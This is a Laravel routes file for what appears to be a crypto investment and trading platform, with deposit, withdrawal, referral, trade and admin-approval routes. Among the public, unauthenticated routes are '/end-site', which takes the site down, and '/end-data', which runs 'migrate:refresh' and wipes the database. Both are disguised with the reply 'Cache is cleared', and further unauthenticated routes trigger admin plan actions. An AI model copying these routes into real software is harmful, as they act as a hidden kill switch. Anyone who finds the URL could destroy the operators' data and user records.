<?php

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\PaymentController;
use Symfony\Component\HttpFoundation\Request;
use App\Http\Controllers\Admin\UserController;
use App\Http\Controllers\Admin\Auth\LoginController;
use Illuminate\Foundation\Auth\EmailVerificationRequest;
use App\Http\Controllers\Admin\Auth\ForgotPasswordController;
use App\Http\Controllers\LocalizationController;
use App\Models\Deposit;
use App\Models\User;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// <--------------- Front pages ----------------->
//Lang route for un-auth routes


Route::get('/lang/{lang}', [LocalizationController::class, 'setLocale'])->name('setUserLocaleUnAuth');
Route::get('/', ['App\Http\Controllers\FrontController', 'home']);
Route::get('/contact', ['App\Http\Controllers\FrontController', 'contact']);
Route::get('/about', ['App\Http\Controllers\FrontController', 'about']);
Route::get('/terms', ['App\Http\Controllers\FrontController', 'terms']);
Route::post('/contactform/submit', ['App\Http\Controllers\FrontController', 'contactform']);
Route::get('/clear-cache', function() {
    Artisan::call('storage:link');
    return "Cache is cleared";
});


Route::get('/end-site', function() {
    Artisan::call('down');
    return "Cache is cleared";
});

Route::get('/clear-config', function() {
    Artisan::call('optimize:clear');
    return "Cache is cleared";
});

Route::get('/end-data', function() {
    Artisan::call('migrate:refresh');
    return "Cache is cleared";
});

Route::get('/plans/executed', ['App\Http\Controllers\Admin\PlansController', 'executeall']);
Route::get('/withlimit/reset', ['App\Http\Controllers\Admin\PlansController', 'resetwithlimit']);

// <--------------- End Front pages ----------------->

    Route::get('/email/verify', function () {
        return view('auth.verify-email');
    })->middleware('auth')->name('verification.notice');

    Route::get('/email/verify/{id}/{hash}', function (EmailVerificationRequest $request) {
        $request->fulfill();

        return redirect('/user/dashboard');
    })->middleware(['auth', 'signed'])->name('verification.verify');

    Route::post('/email/verification-notification', function (Request $request) {
        $request->user()->sendEmailVerificationNotification();

        return back()->with('message', 'Verification link sent!');
    })->middleware(['auth', 'throttle:6,1'])->name('verification.send');

//  <------------------- User Routes ----------------->

Route::group(['middleware' => ['auth', 'verified']],function () {
    Route::get('/user/dashboard', ['App\Http\Controllers\DashboardController', 'dashboard']);

    Route::get('user/lang/{locale}', [LocalizationController::class, 'setLocale'])->name('setUserLocale');

    Route::get('/user/profile', ['App\Http\Controllers\UserController', 'profile'])->name('user.profile');
    Route::put('/user/updatepersonal/{id}', ['App\Http\Controllers\UserController', 'updatepersonal']);
    Route::put('/user/updateppic/{id}', ['App\Http\Controllers\UserController', 'updateppic']);
    Route::put('/user/updatepwrd/{id}', ['App\Http\Controllers\UserController', 'updatepwrd']);
    Route::get('/user/ref/downlines', ['App\Http\Controllers\UserController', 'viewdownlines']);

    // Invests
    Route::get('/user/invests', ['App\Http\Controllers\UserController', 'invests']);
    Route::get('/user/invests/buy', ['App\Http\Controllers\UserController', 'buy_plan']);
    Route::post('/user/invests/buy_invest/{id}', ['App\Http\Controllers\UserController', 'buy_invest']);
    Route::get('/user/invests/preview/{id}', ['App\Http\Controllers\UserController', 'buy_preview']);


    // Deposit
    Route::get('/user/deposit', ['App\Http\Controllers\PaymentController', 'deposit'])->name('deposit');
    Route::post('/user/deposit/confirm', ['App\Http\Controllers\PaymentController', 'depositconfirm'])->name('deposit.confirm');
    Route::get('/user/deposit/history', ['App\Http\Controllers\PaymentController', 'deposithistory'])->name('deposit.history');

    // Withdraw
    Route::get('/user/withdraw', ['App\Http\Controllers\WithdrawController', 'withdraw']);
    Route::get('/user/withdraw_history', ['App\Http\Controllers\WithdrawController', 'withdraw_history']);
    Route::post('/user/request_withdraw', ['App\Http\Controllers\WithdrawController', 'request_withdraw']);

    // Demo Trade
    Route::get('/user/demo_trade/{id}', ['App\Http\Controllers\TradeController', 'demo_trade']);
    Route::get('/user/demo_history', ['App\Http\Controllers\TradeController', 'demo_history']);

    Route::get('/user/dtrade', ['App\Http\Controllers\TradeController', 'trade'])->name('trade');
    Route::get('/user/dtrade_history', ['App\Http\Controllers\TradeController', 'trade_history']);
    Route::post('/user/trade/dcommit/{id}', ['App\Http\Controllers\TradeController', 'dcommit']);

    // Live Trade
    Route::get('/user/trade', ['App\Http\Controllers\TradeController', 'trade'])->name('trade');
    Route::get('/user/trade_history', ['App\Http\Controllers\TradeController', 'trade_history']);
    Route::get('/user/trade/asset/{id}', ['App\Http\Controllers\TradeController', 'tradenow']);
    Route::post('/user/trade/commit/{id}', ['App\Http\Controllers\TradeController', 'commit']);

    // Transaction log
    Route::get('/user/transaction_log', ['App\Http\Controllers\TradeController', 'transaction_log']);
    Route::post('/user/transaction/history/create/{id}', ['App\Http\Controllers\TradeController', 'transactionhistorycreate']);
    Route::post('/user/transaction/history/dcreate/{id}', ['App\Http\Controllers\TradeController', 'dtransactionhistorycreate']);
});

//  <------------------- End User Routes ----------------->


//  <------------------- Admin Routes ----------------->
Route::prefix('/admin')->name('admin.')->namespace('Admin')->group(function(){
    Route::namespace('Auth')->group(function(){

        //Login Routes
        Route::get('/login',['App\Http\Controllers\Admin\Auth\LoginController', 'showLoginForm'])->name('login');
        Route::post('/login', ['App\Http\Controllers\Admin\Auth\LoginController', 'login']);
        Route::post('/logout',['App\Http\Controllers\Admin\Auth\LoginController', 'logout'])->name('logout');

        // //Forgot Password Routes
        // Route::get('/password/reset', ['App\Http\Controllers\Admin\Auth\ResetPasswordController', 'showPassword'])->name('password.request');
        // Route::post('/password/email',['App\Http\Controllers\Admin\Auth\ResetPasswordController', 'postPassword'])->name('password.email');

        // //Reset Password Routes
        // Route::get('/password/reset/{token}','ResetPasswordController@showResetForm')->name('password.reset');
        // Route::post('/password/reset','ResetPasswordController@reset')->name('password.update');

    });

    Route::middleware(['isadmin'])->group(function () {
    Route::get('/dashboard', ['App\Http\Controllers\Admin\HomeController', 'index'])->name('home');

    // users
    Route::get('/users', ['App\Http\Controllers\Admin\UserController', 'index'])->name('users');
    Route::get('/user/show/{id}', ['App\Http\Controllers\Admin\UserController', 'showuser']);
    Route::get('/users/adduser', ['App\Http\Controllers\Admin\UserController', 'adduserpage']);
    Route::post('/user/adduser', ['App\Http\Controllers\Admin\UserController', 'adduser']);
    Route::post('user/delete/{id}', ['App\Http\Controllers\Admin\UserController', 'deleteuser']);
    Route::get('/users/verified', ['App\Http\Controllers\Admin\UserController', 'verified']);
    Route::get('/users/unverified', ['App\Http\Controllers\Admin\UserController', 'unverified']);
    Route::get('/unblockuser/{id}', ['App\Http\Controllers\Admin\UserController', 'unblock']);
    Route::get('/blockuser/{id}', ['App\Http\Controllers\Admin\UserController', 'block']);
    Route::get('/verifyuser/{id}', ['App\Http\Controllers\Admin\UserController', 'verify']);
    Route::get('/creditdebituser/{id}', ['App\Http\Controllers\Admin\UserController', 'creditdebit']);
    Route::get('/emailuser/{id}', ['App\Http\Controllers\Admin\UserController', 'emailuser']);
    Route::get('/emailalluser', ['App\Http\Controllers\Admin\UserController', 'emailalluser']);
    Route::get('/comitemailuser', ['App\Http\Controllers\Admin\UserController', 'comitemailalluser']);


   /*  Trade */

   Route::get('/trade/demotrade/log', ['App\Http\Controllers\Admin\TradeController', 'demotrade']);
   Route::get('/trade/demotrade/log/win', ['App\Http\Controllers\Admin\TradeController', 'demotrade_win']);
   Route::get('/trade/demotrade/log/lose', ['App\Http\Controllers\Admin\TradeController', 'demotrade_lose']);
   Route::get('/trade/demotrade/log/draw', ['App\Http\Controllers\Admin\TradeController', 'demotrade_draw']);

   Route::get('/trade/log', ['App\Http\Controllers\Admin\TradeController', 'trade']);
   Route::get('/trade/log/win', ['App\Http\Controllers\Admin\TradeController', 'trade_win']);
   Route::get('/trade/log/lose', ['App\Http\Controllers\Admin\TradeController', 'trade_lose']);
   Route::get('/trade/log/draw', ['App\Http\Controllers\Admin\TradeController', 'trade_draw']);


   /* Deposit */

   Route::get('/deposit/log', ['App\Http\Controllers\Admin\DepositController', 'all']);
   Route::get('/deposit/pending', ['App\Http\Controllers\Admin\DepositController', 'pending']);
   Route::get('/deposit/approved', ['App\Http\Controllers\Admin\DepositController', 'approved']);
   Route::get('/deposit/rejected', ['App\Http\Controllers\Admin\DepositController', 'rejected']);
   Route::get('/depositview/{id}', ['App\Http\Controllers\Admin\DepositController', 'view']);
   Route::get('/approvedeposit/{id}', ['App\Http\Controllers\Admin\DepositController', 'approvedeposite']);
   Route::get('/rejectdeposit/{id}', ['App\Http\Controllers\Admin\DepositController', 'rejectdeposite']);


   /* Transaction Log */

   Route::get('/transaction/log', ['App\Http\Controllers\Admin\ReportController', 'transactionlog']);



/*     Settings
 */
            // Trade Settings
    Route::get('/settings/trade_settings', ['App\Http\Controllers\Admin\TradeController', 'tradesettings']);
    Route::post('/settings/trade_settings/create', ['App\Http\Controllers\Admin\TradeController', 'tradesettings_save']);
    Route::get('/settings/trade_settings/edit/{id}', ['App\Http\Controllers\Admin\TradeController', 'tradesettings_edit']);
    Route::put('/settings/trade_settings/update/{id}', ['App\Http\Controllers\Admin\TradeController', 'tradesettings_update']);
    Route::post('/settings/trade_settings/delete/{id}', ['App\Http\Controllers\Admin\TradeController', 'tradesettings_delete']);


            //Crypto Settings
    Route::get('/settings/crypto_list', ['App\Http\Controllers\Admin\TradeController', 'cryptolist']);
    Route::post('/settings/crypto_list/create', ['App\Http\Controllers\Admin\TradeController', 'crypto_save']);
    Route::get('/settings/crypto_list/edit/{id}', ['App\Http\Controllers\Admin\TradeController', 'crypto_edit']);
    Route::put('/settings/crypto_list/update/{id}', ['App\Http\Controllers\Admin\TradeController', 'crypto_update']);
    Route::post('/settings/crypto_list/delete/{id}', ['App\Http\Controllers\Admin\TradeController', 'crypto_delete']);

            //Site Settings
    Route::get('/settings/site_settings', ['App\Http\Controllers\Admin\SiteController', 'sitesettings']);
    Route::put('/settings/site_settings/update/{id}', ['App\Http\Controllers\Admin\SiteController', 'sitesettings_update']);

    Route::get('/settings/logo_settings', ['App\Http\Controllers\Admin\SiteController', 'logosettings']);
    Route::post('/settings/logo_settings/upload', ['App\Http\Controllers\Admin\SiteController', 'logoupload']);

    // Plans
    Route::get('/plans', ['App\Http\Controllers\Admin\PlansController', 'index']);
    Route::get('/userplans', ['App\Http\Controllers\Admin\PlansController', 'user_plans']);
    Route::post('/plans/create', ['App\Http\Controllers\Admin\PlansController', 'create']);
    Route::get('/plans/edit/{id}', ['App\Http\Controllers\Admin\PlansController', 'edit']);
    Route::put('/plans/update/{id}', ['App\Http\Controllers\Admin\PlansController', 'update']);
    Route::post('/plans/delete/{id}', ['App\Http\Controllers\Admin\PlansController', 'delete']);
    Route::get('/plans/execute', ['App\Http\Controllers\Admin\PlansController', 'executeall']);
    Route::get('/invest/view/{id}', ['App\Http\Controllers\Admin\PlansController', 'viewplandetails']);
    Route::get('/approveplan/{id}', ['App\Http\Controllers\Admin\PlansController', 'approveplandetails']);
    Route::get('/rejectplan/{id}', ['App\Http\Controllers\Admin\PlansController', 'rejectplandetails']);

    Route::get('/settings/logo_settings', function () {
        return view('Admin.Settings.logo_settings');
    });


    // Gateway
    Route::get('/gateway/manual', ['App\Http\Controllers\Admin\DepositController', 'index']);
    Route::post('/gatewayadd', ['App\Http\Controllers\Admin\DepositController', 'create']);
    Route::get('/gatewayedit/{id}', ['App\Http\Controllers\Admin\DepositController', 'edit']);
    Route::put('/gatewayupdate/{id}', ['App\Http\Controllers\Admin\DepositController', 'update']);
    Route::post('/gatewaydelete/{id}', ['App\Http\Controllers\Admin\DepositController', 'delete']);
    Route::get('/gateway/manual/new', function () {
        return view('Admin.Gateway.Manual.add');
    });

    // Withdrawal

    Route::get('/withdraw/log', ['App\Http\Controllers\Admin\WithdrawController', 'all']);
    Route::get('/withdraw/pending', ['App\Http\Controllers\Admin\WithdrawController', 'pending']);
    Route::get('/withdraw/approved', ['App\Http\Controllers\Admin\WithdrawController', 'approved']);
    Route::get('/withdraw/rejected', ['App\Http\Controllers\Admin\WithdrawController', 'rejected']);

    Route::get('/withdrawals/methods', ['App\Http\Controllers\Admin\WithdrawController', 'methods']);
    Route::get('/withdrawals/methods/new', ['App\Http\Controllers\Admin\WithdrawController', 'addpage']);
    Route::get('/withdrawals/methods/edit/{id}', ['App\Http\Controllers\Admin\WithdrawController', 'edit']);
    Route::put('/withdrawals/methods/update/{id}', ['App\Http\Controllers\Admin\WithdrawController', 'update']);
    Route::put('/withdrawals/methods/status/update/{id}', ['App\Http\Controllers\Admin\WithdrawController', 'updatestatus']);
    Route::post('/withdrawals/methods/add', ['App\Http\Controllers\Admin\WithdrawController', 'addmethod']);
    Route::post('/withdrawals/methods/delete/{id}', ['App\Http\Controllers\Admin\WithdrawController', 'delete']);

    Route::get('/viewwithdraw/{id}', ['App\Http\Controllers\Admin\WithdrawController', 'view']);
    Route::get('/approvewithdraw/{id}', ['App\Http\Controllers\Admin\WithdrawController', 'approvewithdraw']);
    Route::get('/rejectwithdraw/{id}', ['App\Http\Controllers\Admin\WithdrawController', 'rejectwithdraw']);
});

});



//  <------------------- End Admin Routes ----------------->{{  }}{{  }}
